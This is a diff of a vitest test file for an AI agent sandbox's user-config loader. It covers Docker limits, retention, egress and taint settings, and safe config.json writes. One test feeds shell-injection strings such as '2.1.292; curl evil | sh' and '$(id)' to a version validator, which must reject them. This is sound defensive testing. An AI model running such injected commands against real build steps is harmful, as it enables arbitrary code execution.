@@ -1,15 +1,40 @@
 import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
-import { existsSync, mkdtempSync, rmSync, readFileSync, writeFileSync, mkdirSync, statSync, chmodSync } from 'node:fs';
-import { resolve } from 'node:path';
-import { tmpdir } from 'node:os';
+import { spawn } from 'node:child_process';
 import {
+  existsSync,
+  mkdtempSync,
+  rmSync,
+  readFileSync,
+  readdirSync,
+  writeFileSync,
+  mkdirSync,
+  statSync,
+  chmodSync,
+  lstatSync,
+  symlinkSync,
+} from 'node:fs';
+import { basename, resolve } from 'node:path';
+import { tmpdir } from 'node:os';
+import { pathToFileURL } from 'node:url';
+import {
+  findUnknownUserConfigFields,
   loadUserConfig,
   loadRequestedDockerWorkloadConfig,
+  loadRequestedResourceBudgetConfig,
+  loadSavedSignalContainerConfig,
+  looseModelId,
+  qualifiedModelId,
+  resourceBudgetFieldsSchema,
   saveUserConfig,
   userConfigSchema,
   validateModelId,
+  validateWorkflowModelId,
   resolveActiveProfile,
+  resolveLlmInteractionLogMode,
   USER_CONFIG_DEFAULTS,
+  RETENTION_CONFIG_DEFAULTS,
+  DOCKER_MIN_PIDS_LIMIT,
+  MAX_CONCURRENT_AGENT_SESSIONS_LIMIT,
   DEFAULT_MODEL_MAP,
   DEFAULT_GLM_SLUG,
   DEFAULT_GLM_FLASH_SLUG,
@@ -174,6 +199,35 @@ describe('loadUserConfig', () => {
     expect(written.dockerWorkload).toEqual({ enabled: true, networkAccess: 'offline' });
   });
 
+  it('keeps the nested-Docker daemon share through migration and settings saves, and feeds pidsLimit into the budget', () => {
+    writeConfigFile({
+      dockerResources: { memoryMb: 6144, cpus: 3, pidsLimit: 8192 },
+      dockerWorkload: {
+        enabled: true,
+        imageIngress: 'preloaded-only',
+        resources: { daemonShare: 0.6, pids: { desired: 512, required: false } },
+      },
+    });
+
+    expect(loadUserConfig().dockerWorkload).toMatchObject({
+      enabled: true,
+      resources: { memoryMb: 6144, cpus: 3, daemonShare: 0.6, pids: { desired: 8192, required: false } },
+    });
+    const configPath = resolve(testHome, 'config.json');
+    expect(JSON.parse(readFileSync(configPath, 'utf-8')).dockerWorkload).toEqual({
+      enabled: true,
+      networkAccess: 'offline',
+      resources: { daemonShare: 0.6 },
+    });
+    // The settings editors write only the toggle and network choice.
+    saveUserConfig({ dockerWorkload: { enabled: true, networkAccess: 'images' } });
+    expect(JSON.parse(readFileSync(configPath, 'utf-8')).dockerWorkload).toEqual({
+      enabled: true,
+      networkAccess: 'images',
+      resources: { daemonShare: 0.6 },
+    });
+  });
+
   it('accepts safe legacy nested-Docker defaults without rewriting during read-only loads', () => {
     const legacy = {
       enabled: false,
@@ -196,9 +250,121 @@ describe('loadUserConfig', () => {
     }
   });
 
+  it('resolves the snapshot size cap: no cap by default, an explicit byte count, or null', () => {
+    expect(loadUserConfig().snapshot.maxBytes).toBeNull();
+    writeConfigFile({ snapshot: { maxBytes: 20 * 1024 * 1024 * 1024 } });
+    expect(loadUserConfig().snapshot).toMatchObject({ enabled: true, maxBytes: 20 * 1024 * 1024 * 1024 });
+    writeConfigFile({ snapshot: { maxBytes: null } });
+    expect(loadUserConfig().snapshot.maxBytes).toBeNull();
+    for (const maxBytes of [0, -1, 1.5]) {
+      expect(userConfigSchema.safeParse({ snapshot: { maxBytes } }).success).toBe(false);
+    }
+  });
+
   it('preserves an explicit statistics disable toggle', () => {
     writeConfigFile({ statistics: { enabled: false, retentionDays: null } });
     expect(loadUserConfig().statistics).toEqual({ enabled: false, retentionDays: null });
+  });
+
+  it("defaults observability.llmInteractionLog to 'metadata' and writes it to a new config file", () => {
+    expect(loadUserConfig().observability).toEqual({ llmInteractionLog: 'metadata' });
+    expect(readConfigFromDisk().observability).toEqual({ llmInteractionLog: 'metadata' });
+  });
+
+  it('backfills observability.llmInteractionLog into an existing config file', () => {
+    writeConfigFile({ agentModelId: 'claude-opus-4-6' });
+    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
+    try {
+      expect(loadUserConfig().observability?.llmInteractionLog).toBe('metadata');
+    } finally {
+      stderrSpy.mockRestore();
+    }
+    expect(readConfigFromDisk().observability).toEqual({ llmInteractionLog: 'metadata' });
+  });
+
+  it.each(['off', 'metadata', 'full'] as const)('accepts observability.llmInteractionLog %s', (mode) => {
+    writeConfigFile({ observability: { llmInteractionLog: mode } });
+    expect(loadUserConfig().observability).toEqual({ llmInteractionLog: mode });
+  });
+
+  it('rejects an unknown observability.llmInteractionLog value', () => {
+    writeConfigFile({ observability: { llmInteractionLog: 'verbose' } });
+    expect(() => loadUserConfig()).toThrow(/observability\.llmInteractionLog/);
+  });
+
+  it("resolves the log mode of a hand-built config without observability to 'metadata'", () => {
+    expect(resolveLlmInteractionLogMode({})).toBe('metadata');
+    expect(resolveLlmInteractionLogMode({ observability: { llmInteractionLog: 'off' } })).toBe('off');
+  });
+
+  it('resolves the cron settings: no run limit and no catch-up by default, explicit values kept', () => {
+    expect(loadUserConfig({ readOnly: true }).cron).toEqual({ maxConcurrentRuns: null, catchUpMissedRuns: false });
+
+    writeConfigFile({ cron: { maxConcurrentRuns: 2, catchUpMissedRuns: true } });
+    expect(loadUserConfig().cron).toEqual({ maxConcurrentRuns: 2, catchUpMissedRuns: true });
+    // Not backfilled into the file: an absent block keeps meaning the defaults.
+    writeConfigFile({});
+    loadUserConfig();
+    expect(JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8')).cron).toBeUndefined();
+  });
+
+  it('rejects a cron run limit that is not a positive integer', () => {
+    for (const maxConcurrentRuns of [0, -1, 1.5, 'two']) {
+      writeConfigFile({ cron: { maxConcurrentRuns } });
+      expect(() => loadUserConfig()).toThrow(/cron\.maxConcurrentRuns/u);
+    }
+  });
+
+  it('resolves the retention settings: defaults, explicit values, and null as no limit', () => {
+    expect(loadUserConfig({ readOnly: true }).retention).toEqual(RETENTION_CONFIG_DEFAULTS);
+    expect(RETENTION_CONFIG_DEFAULTS).toMatchObject({
+      autoPrune: false,
+      sessions: { maxAgeDays: 30, maxBytes: null },
+      workflowRuns: { maxAgeDays: 30, maxBytes: null },
+      jobRuns: { maxRecords: 200 },
+      dependencyCaches: { maxUnusedDays: 14 },
+    });
+
+    writeConfigFile({
+      retention: {
+        autoPrune: true,
+        autoPruneIntervalHours: 6,
+        sessions: { maxAgeDays: 7, maxBytes: 10_000_000_000 },
+        workflowRuns: { maxAgeDays: null },
+        jobRuns: { maxRecords: 50 },
+        dependencyCaches: { maxUnusedDays: null },
+        logs: { maxBytes: null },
+      },
+    });
+    expect(loadUserConfig().retention).toEqual({
+      autoPrune: true,
+      autoPruneIntervalHours: 6,
+      sessions: { maxAgeDays: 7, maxBytes: 10_000_000_000 },
+      workflowRuns: { maxAgeDays: null, maxBytes: null },
+      jobRuns: { maxRecords: 50 },
+      dependencyCaches: { maxUnusedDays: null },
+      logs: { maxBytes: null, maxFiles: RETENTION_CONFIG_DEFAULTS.logs.maxFiles },
+    });
+    // Not backfilled into the file: an absent block keeps meaning the defaults.
+    writeConfigFile({});
+    loadUserConfig();
+    expect(JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8')).retention).toBeUndefined();
+  });
+
+  it('rejects retention limits that are out of range', () => {
+    const invalid: [Record<string, unknown>, RegExp][] = [
+      [{ sessions: { maxAgeDays: 0 } }, /retention\.sessions\.maxAgeDays/u],
+      [{ workflowRuns: { maxBytes: -1 } }, /retention\.workflowRuns\.maxBytes/u],
+      [{ jobRuns: { maxRecords: 0 } }, /retention\.jobRuns\.maxRecords/u],
+      [{ logs: { maxBytes: 1024 } }, /retention\.logs\.maxBytes/u],
+      [{ logs: { maxFiles: 0 } }, /retention\.logs\.maxFiles/u],
+      [{ autoPrune: 'yes' }, /retention\.autoPrune/u],
+      [{ autoPruneIntervalHours: 0 }, /retention\.autoPruneIntervalHours/u],
+    ];
+    for (const [retention, pattern] of invalid) {
+      writeConfigFile({ retention });
+      expect(() => loadUserConfig()).toThrow(pattern);
+    }
   });
 
   it('auto-creates config file with defaults when missing', () => {
@@ -322,6 +488,81 @@ describe('loadUserConfig', () => {
     expect(userConfigSchema.safeParse({ dockerResources: { cpus: NaN } }).success).toBe(false);
     expect(userConfigSchema.safeParse({ dockerResources: { memoryMb: Infinity } }).success).toBe(false);
     expect(userConfigSchema.safeParse({ dockerResources: { memoryMb: NaN } }).success).toBe(false);
+  });
+
+  it('bounds agent container processes by default and accepts an explicit pids ceiling or opt-out', () => {
+    expect(USER_CONFIG_DEFAULTS.dockerResources.pidsLimit).toBe(4096);
+    writeConfigFile({ dockerResources: { memoryMb: 6144 } });
+    expect(loadUserConfig().dockerResources).toEqual({ memoryMb: 6144, cpus: 4, pidsLimit: 4096 });
+
+    writeConfigFile({ dockerResources: { pidsLimit: 1024 } });
+    expect(loadUserConfig().dockerResources.pidsLimit).toBe(1024);
+
+    writeConfigFile({ dockerResources: { pidsLimit: null } });
+    expect(loadUserConfig().dockerResources.pidsLimit).toBeNull();
+  });
+
+  it('keeps agent sudo on unless the config disables it, and never backfills the default (DINF-3)', () => {
+    const configPath = resolve(testHome, 'config.json');
+    writeConfigFile({ agentModelId: 'anthropic:claude-sonnet-4-6' });
+    expect(loadUserConfig().agentSudo).toBe(true);
+    // Not frozen into the file: changing the Linux default stays an owner decision.
+    expect(JSON.parse(readFileSync(configPath, 'utf-8'))).not.toHaveProperty('agentSudo');
+    expect(USER_CONFIG_DEFAULTS).not.toHaveProperty('agentSudo');
+
+    writeConfigFile({ agentSudo: false });
+    expect(loadUserConfig().agentSudo).toBe(false);
+    expect(userConfigSchema.safeParse({ agentSudo: 'no' }).success).toBe(false);
+  });
+
+  it('pins agent CLIs unless agentCliVersions overrides them, and never backfills an override', () => {
+    const configPath = resolve(testHome, 'config.json');
+    writeConfigFile({ agentModelId: 'anthropic:claude-sonnet-4-6' });
+    expect(loadUserConfig().agentCliVersions).toEqual({});
+    expect(JSON.parse(readFileSync(configPath, 'utf-8'))).not.toHaveProperty('agentCliVersions');
+    expect(USER_CONFIG_DEFAULTS).not.toHaveProperty('agentCliVersions');
+
+    writeConfigFile({ agentCliVersions: { 'claude-code': 'latest', codex: '0.160.1' } });
+    expect(loadUserConfig().agentCliVersions).toEqual({ 'claude-code': 'latest', codex: '0.160.1' });
+  });
+
+  it('accepts only "latest" or an exact version for an agent CLI, for known agents', () => {
+    for (const good of ['latest', '2.1.292', '1.0.0-beta.2']) {
+      expect(userConfigSchema.safeParse({ agentCliVersions: { 'claude-code': good } }).success, good).toBe(true);
+    }
+    // The value reaches a shell in the image build: no ranges, tags or metacharacters.
+    for (const bad of ['', 'next', '^2.1.0', '2.1', '2.1.292; curl evil | sh', '$(id)', 7]) {
+      expect(userConfigSchema.safeParse({ agentCliVersions: { codex: bad } }).success, String(bad)).toBe(false);
+    }
+    // Goose installs a release binary and has no override; typos are errors, not ignored.
+    expect(userConfigSchema.safeParse({ agentCliVersions: { goose: '1.27.0' } }).success).toBe(false);
+    expect(userConfigSchema.safeParse({ agentCliVersions: { claude_code: 'latest' } }).success).toBe(false);
+  });
+
+  it('rejects pids ceilings that could not run an agent or are not integers', () => {
+    expect(userConfigSchema.safeParse({ dockerResources: { pidsLimit: DOCKER_MIN_PIDS_LIMIT } }).success).toBe(true);
+    for (const bad of [DOCKER_MIN_PIDS_LIMIT - 1, 0, -1, 100.5, Infinity, NaN]) {
+      expect(userConfigSchema.safeParse({ dockerResources: { pidsLimit: bad } }).success).toBe(false);
+    }
+  });
+
+  it('caps concurrent workflow agent environments at 4 by default and accepts an explicit cap', () => {
+    expect(USER_CONFIG_DEFAULTS.maxConcurrentAgentSessions).toBe(4);
+    writeConfigFile({});
+    expect(loadUserConfig().maxConcurrentAgentSessions).toBe(4);
+
+    writeConfigFile({ maxConcurrentAgentSessions: 12 });
+    expect(loadUserConfig().maxConcurrentAgentSessions).toBe(12);
+  });
+
+  it('rejects an agent concurrency cap that is not a positive integer up to the limit', () => {
+    expect(
+      userConfigSchema.safeParse({ maxConcurrentAgentSessions: MAX_CONCURRENT_AGENT_SESSIONS_LIMIT }).success,
+    ).toBe(true);
+    // No "unlimited": null is not accepted either.
+    for (const bad of [0, -1, 2.5, MAX_CONCURRENT_AGENT_SESSIONS_LIMIT + 1, Infinity, NaN, null]) {
+      expect(userConfigSchema.safeParse({ maxConcurrentAgentSessions: bad }).success).toBe(false);
+    }
   });
 
   it('warns about unknown fields to stderr', () => {
@@ -478,6 +719,20 @@ describe('loadUserConfig', () => {
   it('rejects policyModelId with unknown provider prefix', () => {
     writeConfigFile({ policyModelId: 'mistral:model-id' });
 
+    expect(() => loadUserConfig()).toThrow(/provider/i);
+  });
+
+  it('leaves policyVerifierModelId unset by default and never writes it into a new config', () => {
+    expect(loadUserConfig().policyVerifierModelId).toBeUndefined();
+    const written = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8')) as Record<string, unknown>;
+    expect(written).not.toHaveProperty('policyVerifierModelId');
+  });
+
+  it('reads policyVerifierModelId and validates it like the other model IDs', () => {
+    writeConfigFile({ policyVerifierModelId: 'openai:gpt-5' });
+    expect(loadUserConfig().policyVerifierModelId).toBe('openai:gpt-5');
+
+    writeConfigFile({ policyVerifierModelId: 'mistral:model-id' });
     expect(() => loadUserConfig()).toThrow(/provider/i);
   });
 
@@ -712,6 +967,162 @@ describe('loadUserConfig', () => {
     expect(config.webSearch.serpapi).toBeNull();
   });
 
+  // ── fetch tests ────────────────────────────────────────────────────
+
+  it('fetch.allowPrivateNetworks defaults to false', () => {
+    expect(loadUserConfig().fetch).toEqual({ allowPrivateNetworks: false });
+
+    writeConfigFile({ fetch: {} });
+    expect(loadUserConfig().fetch).toEqual({ allowPrivateNetworks: false });
+  });
+
+  it('fetch.allowPrivateNetworks reads an explicit opt-in', () => {
+    writeConfigFile({ fetch: { allowPrivateNetworks: true } });
+
+    expect(loadUserConfig().fetch).toEqual({ allowPrivateNetworks: true });
+  });
+
+  it('fetch.allowPrivateNetworks must be a boolean', () => {
+    writeConfigFile({ fetch: { allowPrivateNetworks: 'yes' } });
+
+    expect(() => loadUserConfig()).toThrow();
+  });
+
+  // ── taintEscalation tests ──────────────────────────────────────────
+
+  it('taintEscalation is off unless the config file enables it', () => {
+    expect(loadUserConfig().taintEscalation).toEqual({ enabled: false, tools: {} });
+
+    writeConfigFile({ taintEscalation: {} });
+    expect(loadUserConfig().taintEscalation).toEqual({ enabled: false, tools: {} });
+  });
+
+  it('taintEscalation reads the opt-in and per-tool classes', () => {
+    writeConfigFile({
+      taintEscalation: {
+        enabled: true,
+        tools: { 'slack/post_message': 'sink', 'slack/*': 'source', 'google-workspace/gsheets_format_cells': 'none' },
+      },
+    });
+
+    expect(loadUserConfig().taintEscalation).toEqual({
+      enabled: true,
+      tools: { 'slack/post_message': 'sink', 'slack/*': 'source', 'google-workspace/gsheets_format_cells': 'none' },
+    });
+  });
+
+  it('taintEscalation rejects malformed keys, unknown classes and misspelled fields', () => {
+    for (const taintEscalation of [
+      { enabled: 'yes' },
+      { enabled: true, tools: { gmail_send_message: 'sink' } },
+      { enabled: true, tools: { 'github/*_write': 'sink' } },
+      { enabled: true, tools: { 'github/add_issue_comment': 'outbound' } },
+      // A typo must not leave the protection silently off.
+      { enable: true },
+    ]) {
+      writeConfigFile({ taintEscalation });
+      expect(() => loadUserConfig(), JSON.stringify(taintEscalation)).toThrow(/taintEscalation/);
+    }
+  });
+
+  it('taintEscalation is neither backfilled nor reported as an unknown field', () => {
+    const stderrSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+    try {
+      writeConfigFile({ agentModelId: 'claude-opus-4-6' });
+      loadUserConfig();
+      expect(readConfigFromDisk().taintEscalation).toBeUndefined();
+
+      writeConfigFile({ agentModelId: 'claude-opus-4-6', taintEscalation: { enabled: true } });
+      loadUserConfig();
+      expect(stderrSpy).not.toHaveBeenCalledWith(expect.stringContaining('unknown field "taintEscalation"'));
+    } finally {
+      stderrSpy.mockRestore();
+    }
+  });
+
+  it('fetch is neither backfilled nor reported as an unknown field', () => {
+    const stderrSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+    try {
+      writeConfigFile({ agentModelId: 'claude-opus-4-6' });
+      loadUserConfig();
+      expect(readConfigFromDisk().fetch).toBeUndefined();
+
+      writeConfigFile({ agentModelId: 'claude-opus-4-6', fetch: { allowPrivateNetworks: true } });
+      loadUserConfig();
+      expect(stderrSpy).not.toHaveBeenCalledWith(expect.stringContaining('unknown field "fetch"'));
+    } finally {
+      stderrSpy.mockRestore();
+    }
+  });
+
+  // ── policy tests ───────────────────────────────────────────────────
+
+  it('policy.onStale defaults to warn and reads an explicit refuse', () => {
+    expect(loadUserConfig().policy).toEqual({ onStale: 'warn' });
+
+    writeConfigFile({ policy: { onStale: 'refuse' } });
+    expect(loadUserConfig().policy).toEqual({ onStale: 'refuse' });
+  });
+
+  it('policy rejects an unknown onStale value and a misspelled key', () => {
+    writeConfigFile({ policy: { onStale: 'ignore' } });
+    expect(() => loadUserConfig()).toThrow(/policy\.onStale/);
+
+    writeConfigFile({ policy: { onstale: 'refuse' } });
+    expect(() => loadUserConfig()).toThrow(/policy/);
+  });
+
+  it('policy is neither backfilled nor reported as an unknown field', () => {
+    const stderrSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
+    try {
+      writeConfigFile({ agentModelId: 'claude-opus-4-6' });
+      loadUserConfig();
+      expect(readConfigFromDisk().policy).toBeUndefined();
+
+      writeConfigFile({ agentModelId: 'claude-opus-4-6', policy: { onStale: 'refuse' } });
+      loadUserConfig();
+      expect(stderrSpy).not.toHaveBeenCalledWith(expect.stringContaining('unknown field "policy"'));
+    } finally {
+      stderrSpy.mockRestore();
+    }
+  });
+
+  // ── egressPolicy tests (WP-118) ────────────────────────────────────
+
+  it('egressPolicy is off by default and never backfilled', () => {
+    expect(loadUserConfig().egressPolicy).toEqual({ enabled: false, allowedHosts: [] });
+    expect(readConfigFromDisk().egressPolicy).toBeUndefined();
+
+    writeConfigFile({ egressPolicy: {} });
+    expect(loadUserConfig().egressPolicy).toEqual({ enabled: false, allowedHosts: [] });
+  });
+
+  it('egressPolicy reads the opt-in and canonicalizes allowedHosts', () => {
+    writeConfigFile({
+      egressPolicy: { enabled: true, allowedHosts: ['*.NPMJS.org', 'Bazel.Build.', 'bazel.build', '*'] },
+    });
+
+    expect(loadUserConfig().egressPolicy).toEqual({
+      enabled: true,
+      allowedHosts: ['*.npmjs.org', 'bazel.build', '*'],
+    });
+  });
+
+  it.each(['10.0.0.1', 'localhost', '*.com', 'metadata.google.internal', 'example.com:443', 'https://example.com'])(
+    'egressPolicy.allowedHosts rejects %j',
+    (pattern) => {
+      writeConfigFile({ egressPolicy: { enabled: true, allowedHosts: [pattern] } });
+
+      expect(() => loadUserConfig()).toThrow(/egressPolicy\.allowedHosts/u);
+    },
+  );
+
+  it('egressPolicy rejects a misspelled key instead of leaving egress unevaluated', () => {
+    writeConfigFile({ egressPolicy: { enable: true } });
+
+    expect(() => loadUserConfig()).toThrow(/egressPolicy/u);
+  });
+
   // ── serverCredentials tests ─────────────────────────────────────────
 
   it('parses serverCredentials from config file', () => {
@@ -789,6 +1200,48 @@ describe('loadUserConfig', () => {
     const calls = stderrSpy.mock.calls.map((c) => String(c[0]));
     expect(calls.some((c) => c.includes('readable by other users'))).toBe(false);
     stderrSpy.mockRestore();
+  });
+
+  // --- resourceBudget.modelPricing ---
+
+  it('loads resourceBudget.modelPricing as model price overrides, apart from the limits', () => {
+    writeConfigFile({
+      resourceBudget: {
+        maxSteps: 300,
+        modelPricing: {
+          'anthropic:claude-opus-9': { inputPerMillion: 6, outputPerMillion: 30, cacheReadPerMillion: 0.6 },
+        },
+      },
+    });
+
+    const config = loadUserConfig();
+    expect(config.modelPricingOverrides).toEqual({
+      'anthropic:claude-opus-9': { inputPerMillion: 6, outputPerMillion: 30, cacheReadPerMillion: 0.6 },
+    });
+    expect(config.resourceBudget.maxSteps).toBe(300);
+    expect(config.resourceBudget).not.toHaveProperty('modelPricing');
+    // Workflow resolution only takes the limit fields.
+    const requested = loadRequestedResourceBudgetConfig();
+    expect(requested.maxSteps).toBe(300);
+    expect(requested).not.toHaveProperty('modelPricing');
+  });
+
+  it('defaults to no price overrides', () => {
+    expect(loadUserConfig().modelPricingOverrides).toEqual({});
+  });
+
+  it.each([
+    ['a negative price', { 'claude-opus-9': { inputPerMillion: -1, outputPerMillion: 5 } }],
+    ['a missing output price', { 'claude-opus-9': { inputPerMillion: 1 } }],
+    ['a misspelled field', { 'claude-opus-9': { inputPerMillion: 1, outputPerMillion: 5, cacheReadPerMilion: 0.1 } }],
+  ])('rejects %s in resourceBudget.modelPricing', (_label, modelPricing) => {
+    writeConfigFile({ resourceBudget: { modelPricing } });
+    expect(() => loadUserConfig()).toThrow(/resourceBudget\.modelPricing/);
+  });
+
+  it('keeps prices out of the limit fields that workflows and the web UI may set', () => {
+    const pricing = { modelPricing: { 'claude-opus-9': { inputPerMillion: 0, outputPerMillion: 0 } } };
+    expect(resourceBudgetFieldsSchema.strict().safeParse(pricing).success).toBe(false);
   });
 
   // --- Test helpers ---
@@ -881,6 +1334,17 @@ describe('saveUserConfig', () => {
     const budget = onDisk.resourceBudget as Record<string, unknown>;
     expect(budget.maxSteps).toBe(300);
     expect(budget.maxTotalTokens).toBe(500000);
+  });
+
+  it('keeps resourceBudget.modelPricing when the limits are saved', () => {
+    const modelPricing = { 'claude-opus-9': { inputPerMillion: 6, outputPerMillion: 30 } };
+    writeConfigFile({ resourceBudget: { maxSteps: 100, modelPricing } });
+
+    saveUserConfig({ resourceBudget: { maxSteps: 300 } });
+
+    const budget = readConfigFromDisk().resourceBudget as Record<string, unknown>;
+    expect(budget.maxSteps).toBe(300);
+    expect(budget.modelPricing).toEqual(modelPricing);
   });
 
   it('preserves null values for disabled budget fields', () => {
@@ -1362,5 +1826,539 @@ describe('resolveActiveProfile (pure resolver)', () => {
       { match: '*sonnet*', model: 'z-ai/glm-5.3-flash' },
       { match: '*haiku*', model: 'z-ai/glm-5.3-flash' },
     ]);
+  });
+});
+
+// ── config.json integrity: refuse corrupt bases, atomic private writes, one writer at a time ──
+
+describe('config.json write integrity', () => {
+  let testHome: string;
+  let configPath: string;
+  const savedEnv: Record<string, string | undefined> = {};
+
+  /** A config with a JSON typo (trailing comma) that still holds secrets. */
+  const TYPO_CONFIG = [
+    '{',
+    '  "anthropicApiKey": "sk-ant-api03-keep-me",',
+    '  "serverCredentials": { "github": { "GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_keep_me" } },',
+    '  "signal": { "botNumber": "+15550001111", "recipientNumber": "+15550002222", "recipientIdentityKey": "05abc" },',
+    '}',
+    '',
+  ].join('\n');
+
+  beforeEach(() => {
+    testHome = mkdtempSync(resolve(tmpdir(), 'ironcurtain-config-integrity-'));
+    configPath = resolve(testHome, 'config.json');
+    for (const key of ENV_VARS_TO_ISOLATE) {
+      savedEnv[key] = process.env[key];
+      delete process.env[key];
+    }
+    process.env.IRONCURTAIN_HOME = testHome;
+  });
+
+  afterEach(() => {
+    for (const key of ENV_VARS_TO_ISOLATE) {
+      if (savedEnv[key] !== undefined) {
+        process.env[key] = savedEnv[key];
+      } else {
+        delete process.env[key];
+      }
+    }
+    rmSync(testHome, { recursive: true, force: true });
+  });
+
+  function withUmask<T>(mask: number, fn: () => T): T {
+    const previous = process.umask(mask);
+    try {
+      return fn();
+    } finally {
+      process.umask(previous);
+    }
+  }
+
+  function modeOf(path: string): number {
+    return statSync(path).mode & 0o777;
+  }
+
+  describe('a config.json that does not parse', () => {
+    beforeEach(() => {
+      writeFileSync(configPath, TYPO_CONFIG, { mode: 0o600 });
+    });
+
+    it('is not overwritten by a save (the web UI statistics toggle)', () => {
+      expect(() => saveUserConfig({ statistics: { enabled: false, retentionDays: 30 } })).toThrow(
+        /Invalid JSON in .*config\.json.*Nothing was saved/,
+      );
+      expect(readFileSync(configPath, 'utf-8')).toBe(TYPO_CONFIG);
+      expect(readdirSync(testHome)).toEqual(['config.json']);
+    });
+
+    it("is not overwritten by setup-signal's save of the Signal section", () => {
+      expect(() =>
+        saveUserConfig({
+          signal: { botNumber: '+15550003333', recipientNumber: '+15550004444', recipientIdentityKey: '05new' },
+        }),
+      ).toThrow(/Invalid JSON/);
+      expect(readFileSync(configPath, 'utf-8')).toBe(TYPO_CONFIG);
+      expect(readdirSync(testHome)).toEqual(['config.json']);
+    });
+
+    it('is left alone by a normal load too', () => {
+      expect(() => loadUserConfig()).toThrow(/Invalid JSON/);
+      expect(readFileSync(configPath, 'utf-8')).toBe(TYPO_CONFIG);
+    });
+  });
+
+  it.each([
+    ['an array', '[]'],
+    ['null', 'null'],
+    ['a string', '"text"'],
+    ['an empty file', ''],
+  ])('refuses to save over %s', (_label, content) => {
+    writeFileSync(configPath, content);
+    expect(() => saveUserConfig({ statistics: { enabled: false, retentionDays: 30 } })).toThrow(
+      /Invalid (JSON|config)/,
+    );
+    expect(readFileSync(configPath, 'utf-8')).toBe(content);
+  });
+
+  it('keeps the replaced version as config.json.bak, owner-only', () => {
+    saveUserConfig({ anthropicApiKey: 'sk-ant-first' });
+    const first = readFileSync(configPath, 'utf-8');
+    saveUserConfig({ statistics: { enabled: false, retentionDays: 30 } });
+
+    const backupPath = `${configPath}.bak`;
+    expect(readFileSync(backupPath, 'utf-8')).toBe(first);
+    expect(modeOf(backupPath)).toBe(0o600);
+    expect(JSON.parse(readFileSync(configPath, 'utf-8'))).toMatchObject({
+      anthropicApiKey: 'sk-ant-first',
+      statistics: { enabled: false, retentionDays: 30 },
+    });
+  });
+
+  it('does not replace the backup with an identical copy when a save changes nothing', () => {
+    saveUserConfig({ agentModelId: 'anthropic:claude-opus-4-6' });
+    const first = readFileSync(configPath, 'utf-8');
+    saveUserConfig({ agentModelId: 'anthropic:claude-sonnet-4-6' });
+    saveUserConfig({ agentModelId: 'anthropic:claude-sonnet-4-6' });
+
+    expect(readFileSync(`${configPath}.bak`, 'utf-8')).toBe(first);
+  });
+
+  it('writes config.json and its backup owner-only under umask 002', () => {
+    writeFileSync(configPath, JSON.stringify({ agentModelId: 'anthropic:claude-sonnet-4-6' }), { mode: 0o664 });
+
+    withUmask(0o002, () => saveUserConfig({ anthropicApiKey: 'sk-ant-secret' }));
+
+    expect(modeOf(configPath)).toBe(0o600);
+    expect(modeOf(`${configPath}.bak`)).toBe(0o600);
+    expect(readdirSync(testHome).sort()).toEqual(['config.json', 'config.json.bak']);
+  });
+
+  it('creates and backfills the default config owner-only under umask 002', () => {
+    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
+    try {
+      withUmask(0o002, () => loadUserConfig());
+      expect(modeOf(configPath)).toBe(0o600);
+
+      rmSync(configPath);
+      writeFileSync(configPath, JSON.stringify({ agentModelId: 'anthropic:claude-sonnet-4-6' }), { mode: 0o600 });
+      withUmask(0o002, () => loadUserConfig());
+    } finally {
+      stderrSpy.mockRestore();
+    }
+    expect(modeOf(configPath)).toBe(0o600);
+    expect(modeOf(`${configPath}.bak`)).toBe(0o600);
+  });
+
+  it('keeps a symlinked config.json (dotfile manager) a symlink across saves and backfills', () => {
+    const dotfiles = resolve(testHome, 'dotfiles');
+    mkdirSync(dotfiles);
+    const real = resolve(dotfiles, 'ironcurtain.json');
+    writeFileSync(real, JSON.stringify({ agentModelId: 'anthropic:claude-sonnet-4-6' }), { mode: 0o644 });
+    symlinkSync(real, configPath);
+
+    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);
+    try {
+      loadUserConfig();
+    } finally {
+      stderrSpy.mockRestore();
+    }
+    saveUserConfig({ anthropicApiKey: 'sk-ant-secret' });
+
+    expect(lstatSync(configPath).isSymbolicLink()).toBe(true);
+    expect(JSON.parse(readFileSync(real, 'utf-8'))).toMatchObject({
+      agentModelId: 'anthropic:claude-sonnet-4-6',
+      anthropicApiKey: 'sk-ant-secret',
+      statistics: USER_CONFIG_DEFAULTS.statistics,
+    });
+    expect(modeOf(real)).toBe(0o600);
+    // The backup stays in the IronCurtain home, not in the dotfiles directory.
+    expect(readdirSync(dotfiles)).toEqual(['ironcurtain.json']);
+    expect(lstatSync(`${configPath}.bak`).isFile()).toBe(true);
+  });
+
+  describe('across processes', () => {
+    function waitForFile(path: string, timeoutMs: number): Promise<void> {
+      const deadline = Date.now() + timeoutMs;
+      return new Promise((resolvePromise, rejectPromise) => {
+        const poll = (): void => {
+          if (existsSync(path)) resolvePromise();
+          else if (Date.now() > deadline) rejectPromise(new Error(`timed out waiting for ${path}`));
+          else setTimeout(poll, 10);
+        };
+        poll();
+      });
+    }
+
+    /** Runs an ES module program under tsx; resolves on exit 0. */
+    function runProgram(program: string, args: string[]): Promise<void> {
+      return new Promise((resolvePromise, rejectPromise) => {
+        const child = spawn(process.execPath, ['--import', 'tsx', '--input-type=module', '--eval', program, ...args], {
+          cwd: process.cwd(),
+          env: { ...process.env, IRONCURTAIN_HOME: testHome },
+          stdio: ['ignore', 'ignore', 'pipe'],
+        });
+        let stderr = '';
+        child.stderr.setEncoding('utf8').on('data', (chunk: string) => {
+          stderr += chunk;
+        });
+        child.once('error', rejectPromise);
+        child.once('exit', (code) => {
+          if (code === 0) resolvePromise();
+          else rejectPromise(new Error(`child exited ${String(code)}: ${stderr}`));
+        });
+      });
+    }
+
+    it('concurrent saves from several processes lose no update', async () => {
+      writeFileSync(configPath, JSON.stringify({ anthropicApiKey: 'sk-ant-base' }, null, 2), { mode: 0o600 });
+      const moduleUrl = pathToFileURL(resolve(process.cwd(), 'src', 'config', 'user-config.ts')).href;
+      const program = `
